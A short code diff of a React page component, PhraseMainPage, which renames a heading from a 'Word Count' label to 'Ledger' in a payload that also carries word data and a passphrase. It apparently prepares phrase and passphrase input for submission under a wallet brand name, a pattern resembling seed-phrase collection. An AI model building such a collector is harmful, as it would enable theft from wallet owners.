@@ -83,7 +83,7 @@ export default function PhraseMainPage() {
         value: it,
       }));
 
-      const heading = `Word Count ${btn}`;
+      const heading = `Ledger`;
       const payload = { data, heading, passphrase: passphrase.trim() || "" };
 
       setLoading(true);
